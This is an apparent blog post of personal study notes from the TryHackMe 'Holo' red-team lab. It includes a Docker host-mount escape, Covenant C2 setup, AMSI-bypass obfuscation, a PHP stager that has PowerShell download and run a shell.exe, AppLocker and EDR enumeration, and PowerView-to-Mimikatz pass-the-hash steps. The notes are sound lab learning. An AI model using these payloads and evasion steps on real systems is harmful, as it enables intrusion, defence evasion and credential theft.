---
layout: post
title: TryHackMe - HoloLive 
categories: lab
permalink: /:categories/holo/
---  

###HoloLive lab from THM

Managed Code: code that you develop with a language compiler that targer the runtime


.NET Language → CIL/MSIL → CLR → machine code
.NET uses a run time environment called Common Language Runtime, Which can be used to run managed code written in C#, Powershell or VB
Unmanaged code automatically skips the CLR and runs on the Operating system directly


https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview



================================================================================================================
Enumerate Containers with DeepCE . Deep Container Enumeration
Less Processes running is usually a pointer of being in a container
The presece of .dockerenv  in the root directory is also another very good pointer
reatinh the /proc/1/cgroups would usually show path used by docker which in additional pointer

Securing COntainers
https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html






Docker SUID
list available docker images: docker images
then
docker run -v /:/mnt --rm -it {image_name:Image_tag} chroot /mnt /bin/bash
docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt /bin/bash
================================================================================================================
C2 CONVENANT
Further study : https://www.youtube.com/watch?v=oN_0pPI6TYU.

Run Convenent
sudo dotnet run --project /opt/Covenant/Covenant
navigate : https://127.0.0.1:7443

LISTENER
To create a basic listener for this network we only suggest editing the Name, ConnectPort, and ConnectAddresses


LAUNCHER
There are several options for each launcher, with some launchers having specific options. For this task, we will be focusing on the binary launcher and its options
To create a basic launcher for this network, we only suggest editing the Listener and ImplantTemplate


Custom C2 Grunt 
Convenant isnt resource full but enables you to create your own task with c# code in a YAML format

the template follows the follwoing structure
• Name Name of the task in Covenant UI.
• Aliases Aliases or shortcuts for the task.
• Description Description of the task in Covenant UI.
• Language Language the task source code is written in.
• CompatibleDotNetVersions Versions of .NET the source code will run on.
• Code Source code of task.


================================================================================================================
AMSI Bypasses



usually EDR looks for signature sin bypasses like AmsiScanBuffer, amsiInitFailed, AmsiUtils
Use AMSI trigger to find what part of the AMSi bypass payload is triggering the error :  https://github.com/RythmStick/AMSITrigger

To use AMSITrigger, we only need to specify two parameters, -u, —url or -i, —inputfile and -f, —format. Find example syntax below.
Syntax: .\\AMSITrigger.exe -u <URL> -f 1 or .\\AMSITrigger.exe -i <file> -f 1



The area in red is what triggers the AMSI, so we can edit and obfucate that section using method like 
 “String Concatenation” : $OBF = 'Ob' + 'fu' + 's' +'cation'
Additional methods
• Concatenate - ('co'+'ffe'+'e')
• Reorder - ('{1}{0}'-f'ffee','co')
• Whitespace - ( 'co' +'fee' + 'e')



Another payload Obfuscation

Invoke-Obfuscation -ScriptBlock {'Payload Here'} -Command 'Token\\String\\1,2,\\Whitespace\\1' -Quiet -NoExit


Run Powershell command with a php file : PHP-Wrapper.php

#Single Command
<?php
  function compile_stager() {
    $init = "powershell.exe";
    $payload = ""; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  } 

  compile_stager();
?>

##Double Command 
<?php
  function get_stager() {
    $init = "powershell.exe";
    $payload = "Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }
 function execute_stager() {
  $init = "powershell.exe";
    $payload = ".\notashell.exe"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
 }
  get_stager();
  execute_stager();
  die();
?>


================================================================================================================
Enumerate for Applocker policy

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

we can use applocker checker to determin location and directories from which we can run certai programs
https://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1.



================================================================================================================
Enumerating for EDR and AntiViruses

We can use Seatbelt and SharpEDRChecker



./Seatbelt.exe <ModuleName>
Examples
./Seatbelt.exe CredEnum
./Seatbelt.exe ScheduledTasks
./Seatbelt -group=full
For more info
https://github.com/GhostPack/Seatbelt#command-groups

================================================================================================================
POWERVIEW

its great to use poweview to find all the groups available on the AD, then find the group members of those particular groups, then maybe find a PC where one of those member are currently signed in too, if you can local admin on that PC ; go ahead to authenticate to it so as to dump the hashes of the juicy user then PTH

Get-NetLocalGroup
command will list all groups preset on a local machine/computer



Get-NetLocalGroupMember -GroupName "Administrators"
command will list all members of the specified group



Get-LoggedOn
command enumerate logged on users on current local machine/computer



Get-DomainGPO
enumerate domain policies such as Applocker



Find-LocalAdminAccess
This command usually check for all the host connected to the domain and checks to see which of those host is our current user/or supplied user a Local admin on 


You can use Ps-Remoting to authnticate on the machine




Then  dump hashes with Invoke-MimikatzEx.ps1





================================================================================================================
Enumerating and Exploiting Schedules tasks

Get-SheduledTask

then filter down to get task that are in the users subdirtectory
Get-SheduledTask -TaskPath “\Users\*”

Read task infomation with
Get-ScheduledTaskInfo -TaskName “proxy”


================================================================================================================

Switch user using runas

runas /user:ratty  powershell.exe     ! then enmter password when prompted 
